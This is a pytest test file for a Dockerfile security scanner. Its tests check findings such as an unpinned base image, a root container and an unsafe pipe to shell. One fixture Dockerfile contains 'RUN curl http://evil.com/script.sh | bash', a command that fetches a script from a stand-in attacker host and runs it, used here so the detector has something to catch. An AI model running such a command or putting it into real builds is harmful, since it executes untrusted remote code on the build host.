import pytest
from backend.engine.container.docker_scanner import run_container_scan

def test_dockerfile_runs_as_root():
    content = "FROM ubuntu:latest\nCMD echo hello\n"
    findings = run_container_scan(content)
    titles = [f["title"] for f in findings]
    
    assert "Unpinned Base Image" in titles
    assert "Running as Root Container" in titles

def test_dockerfile_unsafe_pipe():
    content = "FROM alpine:3.18\nUSER appuser\nHEALTHCHECK CMD curl -f http://localhost/\nRUN curl http://evil.com/script.sh | bash\n"
    findings = run_container_scan(content)
    titles = [f["title"] for f in findings]
    
    assert "Unsafe Pipe to Shell" in titles
    assert "Running as Root Container" not in titles # USER appuser exists
